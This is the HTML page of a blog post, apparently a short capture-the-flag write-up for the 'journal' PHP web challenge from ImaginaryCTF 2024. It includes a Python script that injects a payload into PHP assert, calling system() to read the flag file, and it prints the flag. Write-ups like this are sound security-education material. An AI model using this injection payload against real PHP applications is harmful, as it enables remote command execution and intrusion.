@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>journal - ImaginaryCTF 2024 | shafouz blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="journal - ImaginaryCTF 2024" />
+<meta name="author" content="shafouz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="https://ctftime.org/event/2396" />
+<meta property="og:description" content="https://ctftime.org/event/2396" />
+<link rel="canonical" href="https://shafouz.github.io/2024/07/21/journal.html" />
+<meta property="og:url" content="https://shafouz.github.io/2024/07/21/journal.html" />
+<meta property="og:site_name" content="shafouz blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-07-21T04:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="journal - ImaginaryCTF 2024" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"shafouz"},"dateModified":"2024-07-21T04:00:00+00:00","datePublished":"2024-07-21T04:00:00+00:00","description":"https://ctftime.org/event/2396","headline":"journal - ImaginaryCTF 2024","mainEntityOfPage":{"@type":"WebPage","@id":"https://shafouz.github.io/2024/07/21/journal.html"},"url":"https://shafouz.github.io/2024/07/21/journal.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://shafouz.github.io/feed.xml" title="shafouz blog" />
+<!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-F6L4J94HSJ"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-F6L4J94HSJ');
+  </script>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">shafouz blog</a></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">journal - ImaginaryCTF 2024</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-07-21T04:00:00+00:00" itemprop="datePublished">
+        Jul 21, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>https://ctftime.org/event/2396</p>
+
+<h1 id="journal-web">journal (web)</h1>
+
+<p>one file php challenge</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>At first i thought there was some include path stuff.
+But after trying every byte there were some interesting messages about assert.
+And its apparently well known:
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"file1.txt' and die(system(</span><span class="se">\"</span><span class="s">cat /flag*</span><span class="se">\"</span><span class="s">)) or '"</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://journal.chal.imaginaryctf.org/"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s">"file"</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[1]: go.py:14: res.text=</span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">ictf{assertion_failed_e3106922feb13b10}</code></p>
+
+<p>shafouz 2024/07/21</p>
+
+  </div><a class="u-url" href="/2024/07/21/journal.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="https://shafouz.github.io/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">shafouz</li>
+          <li><a class="u-email" href="mailto:jlmacedomatos@gmail.com">contact</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://hackerone.com/shafou" target="_blank" title="hackerone">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#hackerone"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://github.com/shafouz" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/shafouzzzzzz" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/joao-luca/" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
